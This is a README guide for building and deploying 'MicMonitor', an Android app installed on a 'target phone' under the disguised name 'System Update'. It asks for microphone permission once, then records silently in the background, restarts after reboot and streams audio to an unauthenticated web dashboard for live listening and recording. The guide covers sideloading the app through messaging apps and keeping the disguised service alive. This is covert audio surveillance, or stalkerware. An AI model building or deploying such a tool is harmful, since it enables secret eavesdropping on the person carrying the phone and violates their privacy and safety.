# MicMonitor — Complete Build & Deploy Guide

## What This Does

- **Secondary device (target phone):** Install APK → grant mic permission ONCE → auto-streams audio forever
- **Primary device (your PC/phone):** Open browser dashboard → live listen + record + download files

---

## Render (GitHub) Deploy

1. Push this repo to GitHub.
2. In Render: `New +` -> `Blueprint` -> select this repository.
3. Render will auto-detect root `render.yaml` and create `micmonitor-server`.
4. After first deploy, open:
   - `https://<your-render-service>.onrender.com/`

Notes:
- This project now uses STUN-only by default (`STUN_URL`) and no auth token requirement.
- If you previously set old token/TURN vars in Render dashboard, remove them and redeploy.

---

## PART 1 — Build the Android APK

### Step 1 — Prerequisites

1. **Install Android Studio**
   - Download from: https://developer.android.com/studio
   - During install, make sure to check:
     - `Android SDK`
     - `Android SDK Platform`
     - `Android Virtual Device`

2. **Verify Java is installed**

   ```cmd
   java -version
   ```

   If not found → Android Studio installs its own JDK. Use it:

   ```cmd
   set JAVA_HOME=C:\Program Files\Android\Android Studio\jbr
   ```

3. **Set ANDROID_HOME (if not already set)**
   - Open: Windows Search → "Edit the system environment variables"
   - New variable: `ANDROID_HOME` = `C:\Users\YOUR_NAME\AppData\Local\Android\Sdk`
   - Add to PATH: `%ANDROID_HOME%\platform-tools`

---

### Step 2 — Open Project in Android Studio

1. Open **Android Studio**
2. Click **"Open"** (NOT "New Project")
3. Browse to: `MicMonitor/` folder (this folder)
4. Click **OK**
5. Wait for Gradle sync to complete (2-5 minutes first time, downloads dependencies)

---

### Step 3 — Set Your Server IP

> **IMPORTANT:** Before building, set your PC's IP address in `MicService.kt`

1. Find your PC's local IP:

   ```cmd
   ipconfig
   ```

   Look for **IPv4 Address** under your WiFi adapter, e.g. `192.168.1.105`

2. Open file: `app/src/main/java/com/micmonitor/app/MicService.kt`

3. Find this line (around line 60):

   ```kotlin
   const val SERVER_IP = "192.168.1.100"
   ```

4. Change `192.168.1.100` to your actual PC IP, e.g.:

   ```kotlin
   const val SERVER_IP = "192.168.1.105"
   ```

5. Save the file.

---

### Step 4 — Build the APK (2 ways)

#### Option A — Android Studio (easiest)

1. Top menu → **Build** → **Build Bundle(s) / APK(s)** → **Build APK(s)**
2. Wait for build (1-2 minutes)
3. Click **"locate"** in the success notification
4. APK is at: `app/build/outputs/apk/debug/app-debug.apk`

#### Option B — VS Code Terminal (command line)

```cmd
cd "c:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor"

# Download gradle wrapper jar first (run once):
curl -L -o gradle\wrapper\gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.2.0/gradle/wrapper/gradle-wrapper.jar

# Build debug APK:
gradlew.bat assembleDebug

# APK location:
# app\build\outputs\apk\debug\app-debug.apk
```

---

### Step 5 — Install APK on Secondary Device

#### Method A — USB Cable

```cmd
# Enable USB Debugging on secondary phone:
# Settings → About Phone → Tap "Build Number" 7 times
# Settings → Developer Options → Enable "USB Debugging"

# Connect phone via USB, then run:
adb devices           (should show your device)
adb install app\build\outputs\apk\debug\app-debug.apk
```

#### Method B — Send APK file directly

1. Copy `app-debug.apk` to secondary phone (via WhatsApp, email, USB, etc.)
2. On the phone: tap the APK file to install
3. If blocked: Settings → Security → Allow install from unknown sources

---

## PART 2 — Run the Primary Device Server

### Step 1 — Install Node.js

- Download from: https://nodejs.org (LTS version)
- Verify: `node --version`

### Step 2 — Install Server Dependencies

```cmd
cd "c:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\server"
npm install
```


### Step 3 — Start the Server

```cmd
node server.js
```


You'll see:

```
🎤 APK Audio WebSocket listening on ws://0.0.0.0:8080
🌐 Dashboard:  http://localhost:3000
🌐 (LAN access) http://<YOUR_PC_IP>:3000
```

### Step 4 — Open Dashboard

- On **your PC**: Open browser → `http://localhost:3000`
- On **another device on same WiFi**: `http://192.168.1.105:3000` (use your PC's IP)

---

## PART 3 — First Use on Secondary Device

1. Tap the app icon ("System Update")
2. A permission screen appears ONCE
3. Tap **"Grant Permission & Start"**
4. Allow microphone → Allow notifications
5. App closes itself → service runs in background silently
6. **Next time the phone reboots, service starts automatically — no action needed**

---

## PART 4 — Using the Dashboard

| Button                  | Action                                      |
| ----------------------- | ------------------------------------------- |
| **▶ Start Live Listen** | Hear mic audio in real-time in your browser |
| **⏸ Stop Live Listen**  | Stop real-time playback                     |
| **⏺ Start Record**      | Begin saving audio to a .pcm file on server |
| **⏹ Stop Record**       | Stop saving, file appears in download list  |
| **🏓 Ping**             | Check if device is still connected          |

**Download recordings:** Click any file listed under the device card.

**Convert .pcm to .wav (on PC):**

```cmd
# Using ffmpeg (download from https://ffmpeg.org):
ffmpeg -f s16le -ar 16000 -ac 1 -i "recordings\rec_DEVICEID_TIMESTAMP.pcm" output.wav
```

---

## Troubleshooting

| Problem                             | Fix                                                                  |
| ----------------------------------- | -------------------------------------------------------------------- |
| `adb: command not found`            | Add `%ANDROID_HOME%\platform-tools` to PATH                          |
| Gradle sync fails                   | File → Invalidate Caches → Restart (Android Studio)                  |
| App installs but no audio           | Check `SERVER_IP` in `MicService.kt` matches your PC IP              |
| Device shows connected but no audio | Check Windows Firewall allows port 8080                              |
| Service killed on MIUI/EMUI         | Enable "Autostart" for the app in phone settings                     |
| Android 14 crash                    | All fixes already included — check foregroundServiceType in manifest |

### Windows Firewall Fix

```cmd
# Allow port 8080 (run as Administrator):
netsh advfirewall firewall add rule name="MicMonitor" dir=in action=allow protocol=TCP localport=8080
netsh advfirewall firewall add rule name="MicMonitorDash" dir=in action=allow protocol=TCP localport=3000
```

### Battery Optimization (important for background service)

On secondary phone:

- Settings → Battery → Battery Optimization → Find "System Update" → Set to "Don't optimize"
- On MIUI: Settings → Apps → Manage apps → System Update → Autostart → Enable
- On Samsung: Settings → Apps → System Update → Battery → Unrestricted

---

## File Structure

```
MicMonitor/
├── app/
│   ├── src/main/
│   │   ├── java/com/micmonitor/app/
│   │   │   ├── MicApp.kt           — Application class
│   │   │   ├── MainActivity.kt     — One-time permission screen
│   │   │   ├── MicService.kt       — Background mic capture + streaming
│   │   │   └── BootReceiver.kt     — Auto-start after reboot
│   │   ├── res/
│   │   │   ├── layout/activity_main.xml
│   │   │   ├── values/strings.xml
│   │   │   ├── values/themes.xml
│   │   │   └── xml/backup_rules.xml
│   │   └── AndroidManifest.xml
│   ├── build.gradle.kts
│   └── proguard-rules.pro
├── gradle/wrapper/
│   └── gradle-wrapper.properties
├── server/
│   ├── server.js       — Node.js WebSocket server
│   ├── index.html      — Primary device dashboard
│   └── package.json
├── build.gradle.kts
├── settings.gradle.kts
├── gradle.properties
├── gradlew.bat         — Windows build script
└── README.md           — This file
```

---

## Audio Format

- **Sample Rate:** 16,000 Hz (16 kHz — clear voice quality)
- **Channels:** Mono
- **Encoding:** PCM 16-bit (raw, no compression → zero latency)
- **Live stream:** Raw PCM chunks via WebSocket (50ms intervals)
- **Recordings:** Saved as `.pcm` files → convert with ffmpeg to `.wav`
